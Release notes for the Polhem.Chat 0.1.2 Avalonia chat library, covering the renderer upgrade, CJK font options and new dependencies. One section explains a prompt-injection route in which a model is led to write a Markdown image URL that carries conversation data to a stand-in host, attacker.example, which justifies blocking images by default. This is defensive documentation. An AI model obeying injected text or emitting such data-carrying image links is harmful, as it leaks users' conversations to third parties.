# Polhem.Chat 0.1.2 — Release Notes

[繁體中文](../../zh-TW/changelogs/0.1.2.md)

This file holds the details behind the `[0.1.2]` entry in [CHANGELOG.md](../../../CHANGELOG.md).

This release moves `Polhem.Chat.Avalonia` to `Polhem.Markdown.Avalonia` 0.2.1. Replies now render highlighted code,
math, Mermaid diagrams, footnotes, GitHub alerts and the raw HTML README files use. The new Markdown version also loads
images by default, which `ChatView` does not take over: a reply's images stay off until the application allows them.

No public member is removed or changed. What each kind of application has to act on:

- **Applications that want images in replies**: set `ChatView.MarkdownOptions` ([Replies load no
  images](#replies-load-no-images)).
- **Applications whose users read Chinese or Japanese**: set `ChatView.CjkFontFamily` ([Bold CJK text](#bold-cjk-text)).
- **Applications that check their dependencies or publish with trimming**: [New dependencies](#new-dependencies).

## New features and changes

### What replies render

Replies take what `Polhem.Markdown.Avalonia` 0.2 renders: fenced code highlighted by its language, math written as on
GitHub (`$…$`, `$$…$$`), Mermaid flowcharts and sequence diagrams, footnotes, GitHub alerts, strikethrough, task lists,
and the HTML elements README files use, through an allowlist. The [Polhem.Markdown 0.2.0 release
notes](https://github.com/polhem-dev/polhem-markdown/blob/main/docs/en/changelogs/0.2.0.md) describe each.

### `ChatView.MarkdownOptions`

The options a reply's viewer applies: the link schemes it allows, the image schemes it allows, the base URI relative
links resolve against, and whether Mermaid diagrams are drawn. `null`, the default, uses the defaults of
`MarkdownOptions` with no image scheme allowed.

### Bold CJK text

`ChatView.CjkFontFamily` names the family a reply draws CJK text in, for example
`PingFang TC, Microsoft JhengHei UI, Noto Sans CJK TC`. Without it, bold CJK text could draw regular, because of how
Avalonia picks fallback fonts. It is `null` by default, because Traditional Chinese, Simplified Chinese and Japanese draw
the same characters differently, and only the application knows which its users read.

## Changes in behaviour

### Replies load no images

A reply is the model's text. A prompt injection, for example in a web page or a document the model reads with a tool,
can have the model write an image whose address carries data from the conversation:
`![](https://attacker.example/x.png?d=…)`. Showing the reply would load the image and send the data. `Polhem.Markdown`
0.2 loads `https` images by default, so `ChatView` passes options that allow no image scheme: every image in a reply,
written in Markdown or as an HTML `img`, shows its alternative text. In 0.1.1 images showed their alternative text too,
so nothing changes on screen.

**What to do**: an application that trusts its model's output, or that loads images through a proxy it controls,
assigns options of its own. A new `MarkdownOptions` allows `https` images:

```csharp
Chat.MarkdownOptions = new MarkdownOptions();
```

Assign a new instance to change the options later; changing the sets of the assigned one does not rebuild the replies
already shown.

### New dependencies

Through `Polhem.Markdown.Avalonia` 0.2, `Polhem.Chat.Avalonia` now brings `Svg.Skia` and `Avalonia.AvaloniaEdit`.
Neither is part of the public API. The Polhem.Markdown release notes say what each one means for Native AOT and
trimming.
